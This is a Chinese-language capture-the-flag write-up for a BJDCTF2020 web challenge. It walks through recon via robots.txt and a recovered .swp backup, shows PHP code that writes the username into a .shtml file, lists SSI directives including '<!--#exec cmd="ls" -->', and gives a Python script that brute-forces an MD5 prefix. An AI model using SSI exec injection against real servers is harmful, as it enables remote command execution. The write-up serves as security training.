源码：https://github.com/BjdsecCA/BJDCTF2020

主页面一张表单，post提交username和password

尝试sql注入无果

查看robots.txt

发现禁止访问static/secret_key.txt

![image-20250905161109292](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250905161109292.png)

访问以后发现啥也没有

源码没给信息，这时候就考虑目录扫描了。优先扫描备份，成功找到index.php.swp

网页源码如下

```php
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";

    }else
    {
	***
    }
	***
?>
```

这里首先验证你密码的md5值前六位是不是"6d0bc1",然后将用户名的内容写进`public/".get_hash().".shtml`

首先这里写进的文件后缀是shtml

> **SHTML** 是一种特殊的 HTML 扩展，允许在网页中嵌入服务器端指令（SSI），以实现动态内容生成和页面的重复使用

所以重点是可以写入SSI(Server Side Includes)指令。其语法如下

``````html
<!--#exec cmd="ls" -->
<!--#exec cgi="/cgi-bin/access_log.cgi"-->
<!--#echo var="DOCUMENT_URI" -->
<!--#include virtual="/includes/header.html" -->   包含一个相对于网站根目录的虚拟路径的文件
<!--#include file="footer.html" -->                包含一个相对于当前目录的物理路径的文件
``````

最重要就是include和exec。这里exec最为简单，直接写入要执行的系统命令就可以了。

这里本质也是一种代码注入，服务端直接将我们不安全的输入username拼接到shtml文件中

有一个问题是shtml文件名字由get_hash()产生，是随机的，我们如何预测？

其实不需要预测，当你满足第一个条件`$admin == substr(md5($_POST['password']),0,6)`时，服务器返回的响应的消息头中会有这个路径。这里提示我们能做一步就先做，或许就能拿到下一步的线索。

最后很简单，只要爆破一个指定字符串开头的md5值就可以了，代码如下：

```python
import hashlib
import random
def hash_md5(str):
    return hashlib.md5(str.encode('utf-8')).hexdigest()
def generate():
    return str(random.randint(1,10000000))
def boom(target):
    while True:
        i = generate()
        print(f"Test {i}")
        if hash_md5(i).startswith(target):
            print("Yes~")
            return
        else:
            print("NO")

if __name__ == "__main__":
    target = "6d0bc1"
    boom(target)
    """2020666"""
```

后面就是写入SSI指令，然后访问对应的shtml页面查看结果就可以。
